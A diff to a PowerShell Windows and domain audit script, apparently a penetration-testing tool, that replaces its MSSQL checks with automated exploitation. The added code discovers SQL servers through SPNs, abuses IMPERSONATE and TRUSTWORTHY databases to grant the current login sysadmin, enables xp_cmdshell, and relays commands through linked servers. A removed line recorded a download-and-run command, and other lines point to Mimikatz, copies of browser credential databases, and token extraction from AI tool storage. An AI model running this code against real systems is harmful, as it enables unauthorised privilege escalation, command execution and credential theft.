@@ -574,56 +574,6 @@ try {
     Write-Host "[ -- ]   Tombstone check failed, user is probably not Domain Admin" -ForegroundColor DarkGray
 }
 
-# MSSQL Enumeration
-$instances = @()
-try {
-    if (Test-Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL") {
-        $regProps = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"
-        foreach ($prop in $regProps.PSObject.Properties) {
-            if ($prop.Name -notmatch "PS|Item|Drive|Path") {
-                $instances += $prop.Value
-            }
-        }
-    }
-} catch { }
-try {
-    $wmiInstances = Get-WmiObject -Class Win32_Service | Where-Object { $_.Name -like "MSSQL*" } | Select-Object -ExpandProperty Name
-    $instances += $wmiInstances
-} catch { }
-$instances = $instances | Sort-Object -Unique
-if ($instances) {
-    $mssqlLog = "$OUT\mssql_enum.txt"
-    "[P135]   MSSQL Instances Found:`n$($instances -join "`n")" | Add-Content $mssqlLog
-    "`nPowerUpSQL Enumeration:`nIEX (iwr 'https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1').Content" | Add-Content $mssqlLog
-    "Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {`$_.Status -eq 'Accessible'} | Get-SQLServerPrivEscRowThreated" | Add-Content $mssqlLog
-    "`nExploit References:`n- PowerUpSQL: https://github.com/NetSPI/PowerUpSQL`n- xp_cmdshell abuse, impersonation, linked servers" | Add-Content $mssqlLog
-    foreach ($instance in $instances) {
-        $regPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$instance\MSSQLServer"
-        try {
-            $service = Get-WmiObject -Class Win32_Service | Where-Object { $_.Name -eq $instance }
-            if ($service) {
-                "`nInstance: $instance`nService Account: $($service.StartName)`nState: $($service.State)" | Add-Content $mssqlLog
-                if ($service.StartName -match "SYSTEM|LocalService|NetworkService") {
-                    "[!] CRITICAL: Service runs as $($service.StartName)" | Add-Content $mssqlLog
-                }
-            }
-        } catch { }
-        try {
-            $port = (Get-ItemProperty -Path "$regPath\Tcp\IPAll" -Name "TcpPort" -ErrorAction SilentlyContinue).TcpPort
-            if ($port) { "TCP Port: $port" | Add-Content $mssqlLog }
-        } catch { }
-        try {
-            if ((Get-ItemProperty -Path "$regPath\SuperSocketNetLib\Np" -Name "Enabled" -ErrorAction SilentlyContinue).Enabled -eq 1) {
-                "[!] Named Pipes enabled (lateral movement vector)" | Add-Content $mssqlLog
-            }
-        } catch { }
-    }
-    Write-Host "[P135]   MSSQL instances detected -> mssql_enum.txt" -ForegroundColor DarkRed
-    Write-Host "             - PowerUpSQL: https://github.com/NetSPI/PowerUpSQL" -ForegroundColor DarkGray
-} else {
-    Write-Host "[ OK ]   No MSSQL instances detected" -ForegroundColor Green
-}
-
 Write-Host ""
 
 # LLMNR
@@ -890,7 +840,7 @@ $msiResult = foreach ($m in $msis) {
 $sorted = $msiResult | Sort-Object @{Expression='Priority';Descending=$true}, @{Expression='Name';Descending=$false}
 if ($sorted) {
     $report = @()
-    $report += "[P160] MSI Repair LPE - Kandidaten"
+    $report += "[P300] MSI Repair LPE - Kandidaten"
     $report += "===================================="
     $i = 1
     foreach ($item in $sorted) {
@@ -914,7 +864,7 @@ if ($sorted) {
         $i++
     }
     $report | Out-File "$OUT\msi_list.txt" -Encoding utf8
-    Write-Host "[P160]   MSI repair might be LPE possible -> msi_list.txt" -ForegroundColor DarkRed
+    Write-Host "[P300]   MSI repair might be LPE possible -> msi_list.txt" -ForegroundColor DarkRed
     Write-Host '          - msiexec /fa "{GUID from msi_list.txt}"' -ForegroundColor DarkGray
     Write-Host "          - https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" -ForegroundColor DarkGray
 } else {
@@ -927,7 +877,7 @@ Write-Host ""
 try {
     $rdp = cmd /c 'reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" 2>nul'
     if ($rdp -match "MRU") {
-        Write-Host "[P165]   RDP saved servers found -> rdp_servers.txt" -ForegroundColor DarkRed
+        Write-Host "[P460]   RDP saved servers found -> rdp_servers.txt" -ForegroundColor DarkRed
         $rdp | Out-File "$OUT\rdp_servers.txt"
     } else {
         Write-Host "[ OK ]   No saved RDP servers found" -ForegroundColor Green
@@ -940,7 +890,7 @@ try {
 try {
     $putty = cmd /c 'reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>nul'
     if ($putty -match "Sessions") {
-        Write-Host "[P170]   PuTTY sessions configured -> putty_sessions.txt" -ForegroundColor DarkRed
+        Write-Host "[P470]   PuTTY sessions configured -> putty_sessions.txt" -ForegroundColor DarkRed
         $putty | Out-File "$OUT\putty_sessions.txt"
     } else {
         Write-Host "[ OK ]   No PuTTY sessions found" -ForegroundColor Green
@@ -953,7 +903,7 @@ try {
 try {
     $dpapi = Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -ErrorAction SilentlyContinue
     if ($dpapi -and $dpapi.Count -gt 0) {
-        Write-Host "[P175]   DPAPI encrypted credentials found ($($dpapi.Count))" -ForegroundColor DarkYellow
+        Write-Host "[P500]   DPAPI encrypted credentials found ($($dpapi.Count))" -ForegroundColor DarkYellow
         Write-Host "             - Use SharpDPAPI or Mimikatz for decryption" -ForegroundColor DarkGray
     } else {
         Write-Host "[ OK ]   No DPAPI credentials found" -ForegroundColor Green
@@ -964,7 +914,7 @@ try {
 
 # SSH keys
 if (Test-Path "$env:USERPROFILE\.ssh") {
-    Write-Host "[P180]   SSH keys found -> ssh_keys.txt" -ForegroundColor DarkRed
+    Write-Host "[P550]   SSH keys found -> ssh_keys.txt" -ForegroundColor DarkRed
     Get-ChildItem "$env:USERPROFILE\.ssh" | Out-File "$OUT\ssh_keys.txt"
 } else {
     Write-Host "[ OK ]   No SSH keys found" -ForegroundColor Green
@@ -1007,7 +957,7 @@ foreach ($browser in $browserPaths.Keys) {
     }
 }
 if ($found.Count -gt 0) {
-    Write-Host "[P185]   Browser credential stores found: $($found -join ', ') -> db copied to output" -ForegroundColor DarkRed
+    Write-Host "[P570]   Browser credential stores found: $($found -join ', ') -> db copied to output" -ForegroundColor DarkRed
     Write-Host "          - Decrypt with HackBrowserData: https://github.com/moonD4rk/HackBrowserData" -ForegroundColor DarkGray
 } else {
     Write-Host "[ OK ]   No browser credential stores found" -ForegroundColor Green
@@ -1019,7 +969,7 @@ if (Test-Path $histFile) {
     Copy-Item $histFile "$OUT\powershell_history.txt" -ErrorAction SilentlyContinue
     $sensitive = Select-String -Path $histFile -Pattern "password|passwd|pwd|pass=|api.?key|token|secret|credential|auth|login" -ErrorAction SilentlyContinue
     if ($sensitive) {
-        Write-Host "[P190]   Sensitive commands in PowerShell history -> powershell_history.txt" -ForegroundColor DarkRed
+        Write-Host "[P580]   Sensitive commands in PowerShell history -> powershell_history.txt" -ForegroundColor DarkRed
     } else {
         Write-Host "[ OK ]   PowerShell history found -> powershell_history.txt" -ForegroundColor Green
     }
@@ -1056,7 +1006,7 @@ foreach ($tool in $aiTools.Keys) {
 }
 
 if ($foundAI.Count -gt 0) {
-    Write-Host "[P200]   Enterprise AI tool storage found: $($foundAI -join ', ') -> ai_*_storage" -ForegroundColor DarkRed
+    Write-Host "[P600]   Enterprise AI tool storage found: $($foundAI -join ', ') -> ai_*_storage" -ForegroundColor DarkRed
     Write-Host "          - Extract tokens from .ldb files: strings *.ldb | grep -i 'token\|bearer\|api'" -ForegroundColor DarkGray
 } else {
     Write-Host "[ OK ]   No Enterprise AI tool local storage found" -ForegroundColor Green
@@ -1068,11 +1018,11 @@ Write-Host ""
 $screenTimeout = (Get-ItemProperty "HKCU:\Control Panel\Desktop" -Name "ScreenSaveTimeOut" -ErrorAction SilentlyContinue).ScreenSaveTimeOut
 $screenSaverActive = (Get-ItemProperty "HKCU:\Control Panel\Desktop" -Name "ScreenSaveActive" -ErrorAction SilentlyContinue).ScreenSaveActive
 if ($screenSaverActive -ne "1") {
-    Write-Host "[P220]   Screen lock/screensaver not configured" -ForegroundColor DarkRed
+    Write-Host "[P730]   Screen lock/screensaver not configured" -ForegroundColor DarkRed
 } elseif (-not $screenTimeout) {
-    Write-Host "[P220]   Screen lock timeout not set" -ForegroundColor DarkRed
+    Write-Host "[P730]   Screen lock timeout not set" -ForegroundColor DarkRed
 } elseif ([int]$screenTimeout -gt 900) {
-    Write-Host "[P221]   Screen lock timeout too long: $([int]$screenTimeout / 60) minutes (>15)" -ForegroundColor DarkRed
+    Write-Host "[P731]   Screen lock timeout too long: $([int]$screenTimeout / 60) minutes (>15)" -ForegroundColor DarkRed
 } else {
     Write-Host "[ OK ]   Screen lock timeout: $([int]$screenTimeout / 60) minutes" -ForegroundColor Green
 }
@@ -1095,9 +1045,233 @@ foreach ($version in $officeVersions) {
     }
 }
 if ($macroFindings.Count -gt 0) {
-    Write-Host "[P230] Office Macros unrestricted in: $($macroFindings -join ', ')" -ForegroundColor DarkRed
+    Write-Host "[P755] Office Macros unrestricted in: $($macroFindings -join ', ')" -ForegroundColor DarkRed
 } else {
     Write-Host "[ OK ]   Office Macro execution restricted" -ForegroundColor Green
+}
+
+Write-Host ""
+
+# MSSQL Enum
+function sql-Q {
+    param([string]$I, [string]$Q, [string]$D = "master")
+    try {
+        $c = New-Object System.Data.SqlClient.SqlConnection "Server=$I;Database=$D;Integrated Security=SSPI;Connect Timeout=5;Encrypt=False;TrustServerCertificate=True;"
+        $c.Open(); $cmd = $c.CreateCommand(); $cmd.CommandText = $Q; $cmd.CommandTimeout = 5
+        $da = New-Object System.Data.SqlClient.SqlDataAdapter $cmd
+        $ds = New-Object System.Data.DataSet; $null = $da.Fill($ds); $c.Close()
+        if ($ds.Tables.Count -gt 0) { return $ds.Tables[0] }
+    } catch { }
+    return $null
+}
+function sql-X {
+    param([string]$I, [string]$Q, [string]$D = "master")
+    try {
+        $c = New-Object System.Data.SqlClient.SqlConnection "Server=$I;Database=$D;Integrated Security=SSPI;Connect Timeout=5;Encrypt=False;TrustServerCertificate=True;"
+        $c.Open(); $cmd = $c.CreateCommand(); $cmd.CommandText = $Q; $cmd.CommandTimeout = 5
+        $null = $cmd.ExecuteNonQuery(); $c.Close(); return $true
+    } catch { return $false }
+}
+
+# MSSQL Checks
+$sqlTargets = [System.Collections.Generic.List[string]]::new()
+try {
+    $root = [System.DirectoryServices.DirectoryEntry]""
+    $sr = New-Object System.DirectoryServices.DirectorySearcher $root
+    $sr.Filter = "(servicePrincipalName=MSSQLSvc*)"; $sr.PageSize = 1000
+    $sr.PropertiesToLoad.Add("servicePrincipalName") | Out-Null
+    foreach ($r in $sr.FindAll()) {
+        foreach ($spn in $r.Properties["servicePrincipalName"]) {
+            if ($spn -like "MSSQLSvc/*") {
+                $body = $spn -replace "^MSSQLSvc/",""; $parts = $body -split ":"
+                $inst = if ($parts.Count -gt 1 -and $parts[1] -match "^\d+$") { "$($parts[0]),$($parts[1])" }
+                        elseif ($parts.Count -gt 1) { "$($parts[0])\$($parts[1])" }
+                        else { $parts[0] }
+                if ($inst -notin $sqlTargets) { $sqlTargets.Add($inst) }
+            }
+        }
+    }
+} catch { }
+try {
+    $reg = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction Stop
+    foreach ($i in $reg.InstalledInstances) {
+        $inst = if ($i -eq "MSSQLSERVER") { $env:COMPUTERNAME } else { "$env:COMPUTERNAME\$i" }
+        if ($inst -notin $sqlTargets) { $sqlTargets.Add($inst) }
+    }
+} catch { }
+try {
+    $wmiInst = Get-WmiObject -Class Win32_Service | Where-Object { $_.Name -like "MSSQL*" } | Select-Object -ExpandProperty Name
+    foreach ($i in $wmiInst) { if ($i -notin $sqlTargets) { $sqlTargets.Add($i) } }
+} catch { }
+if ($sqlTargets.Count -eq 0) {
+    Write-Host "[ OK ]   No MSSQL instances discovered" -ForegroundColor Green
+} else {
+    $sqlGood = [System.Collections.Generic.List[string]]::new()
+    $sqlSb = { param($i); try { $c = New-Object System.Data.SqlClient.SqlConnection "Server=$i;Database=master;Integrated Security=SSPI;Connect Timeout=5;Encrypt=False;TrustServerCertificate=True;"; $c.Open(); $c.Close(); return $i } catch { return $null } }
+    $sqlJobs = @()
+    foreach ($i in $sqlTargets) {
+        while (($sqlJobs | Where-Object { $_.State -eq "Running" }).Count -ge 10) { Start-Sleep -Milliseconds 150 }
+        $sqlJobs += Start-Job -ScriptBlock $sqlSb -ArgumentList $i
+    }
+    foreach ($j in $sqlJobs) { $r = Receive-Job $j -Wait -AutoRemoveJob; if ($r) { $sqlGood.Add($r) } }
+    if ($sqlGood.Count -eq 0) {
+        Write-Host "[ -- ]   MSSQL instances found but none accessible as current user" -ForegroundColor DarkGray
+        foreach ($t in $sqlTargets) { Write-Host "          - $t" -ForegroundColor DarkGray }
+    } else {
+        $mssqlLog = "$OUT\mssql_enum.txt"
+        $mssqlOut = [System.Collections.Generic.List[string]]::new()
+        foreach ($inst in $sqlGood) {
+            $mssqlOut.Add("================================================================")
+            $mssqlOut.Add(" $inst")
+            $mssqlOut.Add("================================================================")
+            $q = sql-Q $inst ("SELECT @@SERVERNAME AS Name, SERVERPROPERTY('ProductVersion') AS Version, SERVERPROPERTY('Edition') AS Edition, SERVERPROPERTY('IsIntegratedSecurityOnly') AS WinAuthOnly, SYSTEM_USER AS Login, IS_SRVROLEMEMBER('sysadmin') AS IsSA")
+            if ($q) {
+                $r = $q.Rows[0]
+                $mssqlOut.Add("Name    : $($r.Name)")
+                $mssqlOut.Add("Version : $($r.Version) -- $($r.Edition)")
+                $mssqlOut.Add("AuthMode: $(if ($r.WinAuthOnly -eq 1) { 'Windows Only' } else { 'Mixed (SQL+Windows)' })")
+                $mssqlOut.Add("Login   : $($r.Login) | sysadmin=$($r.IsSA)")
+                $currentLogin = "$($r.Login)"
+                $isSA = $r.IsSA
+                if ($r.WinAuthOnly -eq 0) { $mssqlOut.Add("[P801]   Mixed Authentication Mode enabled") }
+            }
+
+            # Logins
+            $mssqlOut.Add(""); $mssqlOut.Add("--- Logins ---")
+            $q = sql-Q $inst ("SELECT sp.name AS Login, sp.type_desc AS Type, sp.is_disabled AS Disabled, IS_SRVROLEMEMBER('sysadmin', sp.name) AS SA FROM sys.server_principals sp WHERE sp.type IN ('S','U','G') AND sp.name NOT LIKE '##%' ORDER BY SA DESC, sp.name")
+            if ($q) { $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String)) }
+
+            # Databases
+            $mssqlOut.Add("--- Databases ---")
+            $q = sql-Q $inst ("SELECT name AS DB, is_trustworthy_on AS Trustworthy, SUSER_SNAME(owner_sid) AS Owner, IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(owner_sid)) AS OwnerSA, HAS_DBACCESS(name) AS HasAccess FROM sys.databases ORDER BY Trustworthy DESC, name")
+            if ($q) {
+                $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String))
+                foreach ($r in $q.Rows) {
+                    if ($r.Trustworthy -eq $true -and $r.DB -ne "msdb") { $mssqlOut.Add("[P802]   TRUSTWORTHY: $($r.DB) (Owner: $($r.Owner), OwnerSA=$($r.OwnerSA))") }
+                }
+            }
+
+            # Dangerous config
+            $mssqlOut.Add("--- Configuration ---")
+            $q = sql-Q $inst ("SELECT name, value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','Ole Automation Procedures','clr enabled','Ad Hoc Distributed Queries','cross db ownership chaining')")
+            if ($q) {
+                $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String))
+                foreach ($r in $q.Rows) { if ($r.value_in_use -eq 1) { $mssqlOut.Add("[P803]   ENABLED: $($r.name)") } }
+            }
+
+            # Impersonation
+            $mssqlOut.Add("--- IMPERSONATE Permissions ---")
+            $q = sql-Q $inst ("SELECT grantee.name AS Grantee, target.name AS Target, IS_SRVROLEMEMBER('sysadmin', target.name) AS TargetSA FROM sys.server_permissions p JOIN sys.server_principals grantee ON p.grantee_principal_id = grantee.principal_id JOIN sys.server_principals target ON p.major_id = target.principal_id WHERE p.permission_name = 'IMPERSONATE'")
+            if ($q -and $q.Rows.Count -gt 0) {
+                $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String))
+                foreach ($r in $q.Rows) { $mssqlOut.Add("[P804]   IMPERSONATE: $($r.Grantee) -> $($r.Target) (SA=$($r.TargetSA))") }
+            } else { $mssqlOut.Add("None found.") }
+
+            # Linked servers
+            $mssqlOut.Add("--- Linked Servers ---")
+            $q = sql-Q $inst ("SELECT srv.name AS LinkedServer, srv.data_source, ll.uses_self_credential AS Passthrough, ll.remote_name AS RemoteLogin FROM sys.servers srv LEFT JOIN sys.linked_logins ll ON srv.server_id = ll.server_id WHERE srv.is_linked = 1")
+            if ($q -and $q.Rows.Count -gt 0) { $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String)); $mssqlOut.Add("[P805]   Linked servers present") }
+            else { $mssqlOut.Add("None found.") }
+
+            # db_owner
+            $mssqlOut.Add("--- db_owner Memberships ---")
+            $dbs = sql-Q $inst "SELECT name FROM sys.databases WHERE HAS_DBACCESS(name) = 1 AND state = 0"
+            if ($dbs) {
+                foreach ($dbRow in $dbs.Rows) {
+                    $db = $dbRow.name
+                    $q = sql-Q $inst ("SELECT '$db' AS DB, r.name AS Role, m.name AS Member FROM [$db].sys.database_role_members drm JOIN [$db].sys.database_principals r ON drm.role_principal_id = r.principal_id JOIN [$db].sys.database_principals m ON drm.member_principal_id = m.principal_id WHERE r.name = 'db_owner' AND m.name NOT IN ('dbo','sa')") -D $db
+                    if ($q -and $q.Rows.Count -gt 0) {
+                        $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String))
+                        foreach ($r in $q.Rows) { $mssqlOut.Add("[P806]   db_owner: $($r.Member) in [$db]") }
+                    }
+                }
+            }
+
+            # Agent jobs
+            $mssqlOut.Add("--- SQL Agent Jobs (CmdExec/PS) ---")
+            $q = sql-Q $inst ("SELECT j.name AS Job, js.subsystem, LEFT(js.command,200) AS Cmd FROM msdb.dbo.sysjobs j JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id WHERE js.subsystem IN ('CmdExec','PowerShell','ActiveScripting')")
+            if ($q -and $q.Rows.Count -gt 0) { $mssqlOut.Add(($q | Format-Table -AutoSize | Out-String)); $mssqlOut.Add("[P807]   CmdExec/PS agent jobs found") }
+            else { $mssqlOut.Add("None found.") }
+
+            # PrivEsc: Impersonation
+            $mssqlOut.Add("--- PrivEsc: Impersonation ---")
+            $q = sql-Q $inst ("SELECT grantee.name AS Grantee, target.name AS Target FROM sys.server_permissions p JOIN sys.server_principals grantee ON p.grantee_principal_id = grantee.principal_id JOIN sys.server_principals target ON p.major_id = target.principal_id WHERE p.permission_name = 'IMPERSONATE' AND IS_SRVROLEMEMBER('sysadmin', target.name) = 1")
+            if ($q -and $q.Rows.Count -gt 0) {
+                foreach ($r in $q.Rows) {
+                    $null = sql-X $inst "EXECUTE AS LOGIN = '$($r.Target)'; EXEC sp_addsrvrolemember '$currentLogin','sysadmin'; REVERT;"
+                    $chk = sql-Q $inst "SELECT IS_SRVROLEMEMBER('sysadmin','$currentLogin') AS SA"
+                    if ($chk -and $chk.Rows[0].SA -eq 1) { $mssqlOut.Add("[P808]   EXPLOITED: sysadmin via IMPERSONATE $($r.Target)") }
+                    else { $mssqlOut.Add("Impersonation attempt failed for $($r.Target).") }
+                }
+            } else { $mssqlOut.Add("No exploitable impersonation paths.") }
+
+            # PrivEsc: db_owner + Trustworthy
+            $mssqlOut.Add("--- PrivEsc: db_owner + TRUSTWORTHY ---")
+            $q = sql-Q $inst ("SELECT d.name AS DB, IS_SRVROLEMEMBER('sysadmin', SUSER_SNAME(d.owner_sid)) AS OwnerSA FROM sys.databases d WHERE d.is_trustworthy_on = 1 AND d.name <> 'msdb' AND HAS_DBACCESS(d.name) = 1 AND d.state = 0")
+            if ($q -and $q.Rows.Count -gt 0) {
+                foreach ($dbRow in $q.Rows) {
+                    $db = $dbRow.DB
+                    $rc = sql-Q $inst ("SELECT COUNT(*) AS cnt FROM [$db].sys.database_role_members drm JOIN [$db].sys.database_principals r ON drm.role_principal_id = r.principal_id JOIN [$db].sys.database_principals m ON drm.member_principal_id = m.principal_id WHERE r.name = 'db_owner' AND m.name = USER_NAME()") -D $db
+                    if ($rc -and $rc.Rows[0].cnt -gt 0 -and $dbRow.OwnerSA -eq 1) {
+                        $null = sql-X $inst "CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS BEGIN EXEC sp_addsrvrolemember '$currentLogin','sysadmin' END" -D $db
+                        $null = sql-X $inst "sp_elevate_me" -D $db
+                        $null = sql-X $inst "DROP PROCEDURE sp_elevate_me" -D $db
+                        $chk = sql-Q $inst "SELECT IS_SRVROLEMEMBER('sysadmin','$currentLogin') AS SA"
+                        if ($chk -and $chk.Rows[0].SA -eq 1) { $mssqlOut.Add("[P809]   EXPLOITED: sysadmin via db_owner+Trustworthy in [$db]") }
+                        else { $mssqlOut.Add("db_owner+Trustworthy failed in [$db].") }
+                    } else { $mssqlOut.Add("[$db] Trustworthy but not exploitable as current user.") }
+                }
+            } else { $mssqlOut.Add("No trustworthy databases.") }
+
+            # PrivEsc: xp_cmdshell
+            $mssqlOut.Add("--- PrivEsc: xp_cmdshell ---")
+            $q = sql-Q $inst "SELECT value_in_use AS Enabled FROM sys.configurations WHERE name = 'xp_cmdshell'"
+            if ($q) {
+                $enabled = $q.Rows[0].Enabled
+                $saChk = sql-Q $inst "SELECT IS_SRVROLEMEMBER('sysadmin') AS SA"
+                $sa = if ($saChk) { $saChk.Rows[0].SA } else { 0 }
+                if ($enabled -eq 1) {
+                    $r = sql-Q $inst "EXEC xp_cmdshell 'whoami'"
+                    if ($r) { $mssqlOut.Add("[P810]   xp_cmdshell enabled, whoami: $($r.Rows[0][0])") }
+                } elseif ($sa -eq 1) {
+                    $null = sql-X $inst "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
+                    $null = sql-X $inst "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
+                    $r = sql-Q $inst "EXEC xp_cmdshell 'whoami'"
+                    if ($r) { $mssqlOut.Add("[P810]   xp_cmdshell enabled as sysadmin, whoami: $($r.Rows[0][0])") }
+                    $null = sql-X $inst "EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;"
+                } else { $mssqlOut.Add("xp_cmdshell disabled, not sysadmin.") }
+            }
+
+            # PrivEsc: Linked server relay
+            $mssqlOut.Add("--- PrivEsc: Linked Server Relay ---")
+            $links = sql-Q $inst "SELECT name FROM sys.servers WHERE is_linked = 1"
+            if ($links -and $links.Rows.Count -gt 0) {
+                foreach ($lRow in $links.Rows) {
+                    $ls = $lRow.name
+                    $q = sql-Q $inst "SELECT * FROM OPENQUERY([$ls], 'SELECT SYSTEM_USER AS u, IS_SRVROLEMEMBER(''sysadmin'') AS sa')"
+                    if ($q -and $q.Rows.Count -gt 0) {
+                        $u = $q.Rows[0].u; $sa = $q.Rows[0].sa
+                        if ($sa -eq 1) {
+                            $r = sql-Q $inst "EXEC ('EXEC xp_cmdshell ''whoami'' WITH RESULT SETS ((output VARCHAR(MAX)))') AT [$ls]"
+                            $mssqlOut.Add("[P811]   Linked server [$ls] sysadmin relay, whoami: $(if ($r) { $r.Rows[0][0] } else { 'n/a' })")
+                        } else { $mssqlOut.Add("[$ls] remote user=$u (not sysadmin).") }
+                    } else { $mssqlOut.Add("[$ls] OPENQUERY failed.") }
+                }
+            } else { $mssqlOut.Add("No linked servers.") }
+        }
+
+        $mssqlOut | Out-File $mssqlLog -Encoding utf8
+        $hasFindings = $mssqlOut | Where-Object { $_ -match "^\[P8" }
+        if ($hasFindings) {
+            Write-Host "[P800]   MSSQL instances accessible -> mssql_enum.txt" -ForegroundColor DarkRed
+            foreach ($line in $hasFindings) {
+                Write-Host "          - $line" -ForegroundColor DarkRed
+            }
+        } else {
+            Write-Host "[P800]   MSSQL instances accessible, no privesc vectors found -> mssql_enum.txt" -ForegroundColor DarkYellow
+            foreach ($i in $sqlGood) { Write-Host "          - $i" -ForegroundColor DarkGray }
+        }
+    }
 }
 
 Write-Host ""
